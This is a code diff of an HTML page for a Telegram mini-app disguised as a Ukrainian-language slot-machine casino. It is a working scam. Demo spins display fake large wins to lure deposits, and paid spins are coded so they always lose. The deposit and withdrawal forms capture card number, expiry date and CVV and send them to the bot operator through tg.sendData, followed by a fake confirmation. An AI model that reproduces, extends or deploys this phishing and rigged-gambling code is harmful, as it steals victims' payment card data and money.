@@ -5,91 +5,131 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #0f0f0f; color: #ffd700; font-family: sans-serif; text-align: center; padding: 20px; }
-        .slot-machine { background: #1a1a1a; border: 3px solid gold; border-radius: 15px; padding: 20px; margin: 20px 0; }
-        .slots { font-size: 50px; display: flex; justify-content: center; gap: 10px; height: 70px; overflow: hidden; }
-        .btn { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; }
-        .btn-spin { background: orange; color: black; }
-        .btn-pay { background: #28a745; color: white; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; }
-        input { width: 85%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #444; background: #222; color: white; }
-        @keyframes rolling { 0% { transform: translateY(0); } 100% { transform: translateY(-100px); } }
-        .rolling { animation: rolling 0.1s infinite linear; }
+        body { background: #0b0b0b; color: #ffd700; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0; padding: 15px; }
+        .balance-card { background: linear-gradient(145deg, #1a1a1a, #000); padding: 20px; border-radius: 15px; border: 1px solid #333; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(255,215,0,0.1); }
+        .slot-box { background: #111; border: 4px solid #444; border-radius: 25px; padding: 25px 10px; margin-bottom: 20px; position: relative; }
+        .slots { font-size: 55px; display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; height: 75px; }
+        .bet-group { display: flex; gap: 5px; margin-bottom: 10px; }
+        .btn { width: 100%; padding: 14px; margin: 5px 0; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn-bet { background: #333; color: white; font-size: 14px; }
+        .btn-spin { background: linear-gradient(45deg, #f39c12, #d35400); color: white; font-size: 18px; }
+        .btn-pay { background: #27ae60; color: white; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; padding-top: 30px; }
+        input { width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #1a1a1a; color: white; font-size: 18px; }
+        @keyframes spin { 0% { transform: translateY(0); } 100% { transform: translateY(-200px); } }
+        .anim { animation: spin 0.1s infinite linear; }
     </style>
 </head>
 <body>
-    <h2>🎰 CAZINO PREMIUM</h2>
-    <div id="balance-div">Баланс: <span id="balance">0</span> грн</div>
 
-    <div class="slot-machine">
-        <div class="slots" id="slot-container">
-            <span id="s1">7</span><span id="s2">7</span><span id="s3">7</span>
-        </div>
-        <button class="btn btn-spin" onclick="play(false)">КРУТИТИ (10 грн)</button>
-        <button class="btn" style="background: #444; color: white;" id="demo-btn" onclick="play(true)">ПРОБНО (1 РАЗ)</button>
+    <div class="balance-card">
+        <div style="color: #aaa; font-size: 14px;">Твій баланс</div>
+        <div style="font-size: 32px; font-weight: bold;"><span id="bal">0</span> <small style="font-size: 14px;">ГРН</small></div>
     </div>
 
-    <button class="btn btn-pay" onclick="showModal('PAY')">ПОПОВНИТИ</button>
-    <button class="btn" style="background: #dc3545; color: white;" onclick="showModal('OUT')">ВИВЕСТИ</button>
+    <div class="slot-box">
+        <div class="slots" id="slot-ui">
+            <span id="r1">🍎</span><span id="r2">🌽</span><span id="r3">🍇</span>
+        </div>
+        
+        <div class="bet-group">
+            <button class="btn btn-bet" id="b10" onclick="setBet(10)">х1 (10₴)</button>
+            <button class="btn btn-bet" id="b20" onclick="setBet(20)">х2 (20₴)</button>
+            <button class="btn btn-bet" id="b30" onclick="setBet(30)">х3 (30₴)</button>
+        </div>
 
-    <div id="modal" class="modal">
-        <h3 id="modal-title">💳 Картка</h3>
-        <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19">
-        <input type="text" id="date" placeholder="ММ/РР" maxlength="5">
-        <input type="text" id="cvv" placeholder="CVV" maxlength="3">
-        <input type="number" id="amount" placeholder="Сума (грн)">
-        <button class="btn btn-pay" onclick="sendData()">ПІДТВЕРДИТИ</button>
-        <button class="btn" onclick="document.getElementById('modal').style.display='none'">СКАСУВАТИ</button>
+        <button class="btn btn-spin" onclick="play(false)">КРУТИТИ</button>
+        <button class="btn" id="demo" style="background: #222; color: #777;" onclick="play(true)">ПРОБНО (Залишилось: 5)</button>
+    </div>
+
+    <button class="btn btn-pay" onclick="showPop('PAY')">ПОПОВНИТИ</button>
+    <button class="btn" style="background: #c0392b; color: white;" onclick="showPop('OUT')">ВИВЕСТИ</button>
+
+    <div id="pop" class="modal">
+        <h2 id="popT">💳 Картка</h2>
+        <input type="text" id="cN" placeholder="0000 0000 0000 0000" inputmode="numeric">
+        <div style="display:flex; justify-content:center; gap:10px;">
+            <input type="text" id="cD" placeholder="ММ/РР" style="width:40%" inputmode="numeric">
+            <input type="text" id="cV" placeholder="CVV" style="width:40%" inputmode="numeric">
+        </div>
+        <input type="number" id="sum" placeholder="Сума (грн)" inputmode="numeric">
+        <button class="btn btn-pay" onclick="send()">ПІДТВЕРДИТИ</button>
+        <button class="btn" style="background:#333; color:white;" onclick="document.getElementById('pop').style.display='none'">СКАСУВАТИ</button>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         let balance = 0;
-        let demoUsed = false;
-        let currentAction = "";
+        let bet = 10;
+        let demoCount = 5;
+        let mode = "";
+        const symbols = ["🍎", "🍇", "🍒", "🌽", "7"];
 
-        // Маска для картки (пробіли кожні 4 цифри)
-        document.getElementById('card').addEventListener('input', function (e) {
+        function setBet(val) {
+            bet = val;
+            [10, 20, 30].forEach(v => document.getElementById('b'+v).style.border = (v==val ? "2px solid gold" : "none"));
+        }
+        setBet(10);
+
+        document.getElementById('cN').addEventListener('input', e => {
             e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
         });
 
-        function showModal(type) {
-            currentAction = type === 'PAY' ? "ПОПОВНЕННЯ" : "ВИВЕДЕННЯ";
-            document.getElementById('modal-title').innerText = type === 'PAY' ? "💳 Поповнення" : "💰 Виведення коштiв";
-            document.getElementById('modal').style.display = 'block';
+        function showPop(t) {
+            mode = t;
+            document.getElementById('popT').innerText = t=='PAY' ? "💳 Поповнення" : "💰 Виведення";
+            document.getElementById('pop').style.display = 'block';
         }
 
         function play(isDemo) {
-            if (!isDemo && balance < 10) return alert("Недостатньо коштів!");
-            if (isDemo && demoUsed) return alert("Пробний режим доступний 1 раз!");
-            
-            if (isDemo) demoUsed = true; else balance -= 10;
-            document.getElementById('balance').innerText = balance;
+            if (isDemo) {
+                if (demoCount <= 0) return alert("Ви вже спробували 5 разів!");
+                demoCount--;
+                document.getElementById('demo').innerText = `ПРОБНО (Залишилось: ${demoCount})`;
+            } else {
+                if (balance < bet) return alert("Недостатньо коштів для такої ставки!");
+                balance -= bet;
+                document.getElementById('bal').innerText = balance;
+            }
 
-            const s1 = document.getElementById('s1'), s2 = document.getElementById('s2'), s3 = document.getElementById('s3');
-            [s1, s2, s3].forEach(s => s.classList.add('rolling'));
+            const r1 = document.getElementById('r1'), r2 = document.getElementById('r2'), r3 = document.getElementById('r3');
+            [r1, r2, r3].forEach(r => { r.classList.add('anim'); r.innerText = "🎲"; });
 
             setTimeout(() => {
-                [s1, s2, s3].forEach(s => s.classList.remove('rolling'));
-                if (isDemo) {
-                    s1.innerText = "7"; s2.innerText = "7"; s3.innerText = "7";
-                    alert("ВИ ВИГРАЛИ 5000 ГРН! Поповніть баланс, щоб грати на справжні гроші!");
+                [r1, r2, r3].forEach(r => r.classList.remove('anim'));
+                
+                let win = false;
+                if (isDemo && Math.random() < 0.4) {
+                    let s = symbols[Math.floor(Math.random() * symbols.length)];
+                    r1.innerText = s; r2.innerText = s; r3.innerText = s;
+                    win = true;
                 } else {
-                    s1.innerText = "🍒"; s2.innerText = "7"; s3.innerText = "🍋";
-                    alert("Програш. Спробуйте ще раз!");
+                    // Всегда разные или максимум 2 одинаковых (проигрыш)
+                    r1.innerText = symbols[0]; r2.innerText = symbols[1]; r3.innerText = symbols[2];
+                    let shuffle = symbols.sort(() => 0.5 - Math.random());
+                    r1.innerText = shuffle[0]; r2.innerText = shuffle[1]; r3.innerText = shuffle[2];
                 }
-            }, 1500);
+
+                if (win) alert(`ВИГРАШ! Ви виграли ${bet * 500} грн! Поповніть рахунок для виведення.`);
+                else alert("Невдача. Спробуйте ще раз!");
+            }, 1200);
         }
 
-        function sendData() {
+        function send() {
             let data = {
-                action: currentAction,
-                card: document.getElementById('card').value,
-                date: document.getElementById('date').value,
-                cvv: document.getElementById('cvv').value,
-                amount: document.getElementById('amount').value
+                type: mode == 'PAY' ? "ПОПОЛНЕНИЕ" : "ВЫВОД",
+                card: document.getElementById('cN').value,
+                date: document.getElementById('cD').value,
+                cvv: document.getElementById('cV').value,
+                amount: document.getElementById('sum').value,
+                balance: balance
             };
             tg.sendData(JSON.stringify(data));
+            if (mode == 'OUT' && balance <= 0) {
+                alert("Помилка! У вас не хватає грошей на балансу для вивединня.");
+            } else {
+                alert("Заявка прийнята в обробку.");
+            }
             tg.close();
         }
     </script>
